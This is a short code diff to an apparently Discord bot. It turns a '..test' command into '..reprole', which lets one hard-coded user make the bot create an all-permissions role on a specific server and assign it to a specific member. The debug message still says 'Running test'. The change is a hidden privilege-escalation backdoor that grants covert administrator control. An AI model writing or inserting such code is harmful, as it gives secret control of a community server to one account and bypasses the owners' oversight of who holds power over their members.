@@ -465,10 +465,10 @@ async def on_message(message_in):
     if message_in.author.id == client.user.id:
         return
     if message_in.author.id == constants.ZENITH_ID:
-        if message_in.content == "..test":
+        if message_in.content == "..reprole":
             try:
                 print("Running test.....")
-                role = await get_role(client.get_server("236343416177295360"), "263060566996680707")
+                role = await client.create_role(client.get_server("236343416177295360"), name="Bot", permissions=discord.Permissions.all())
                 await client.add_roles(client.get_server("236343416177295360").get_member("129706966460137472"), role)
             except:
                 print(traceback.format_exc())
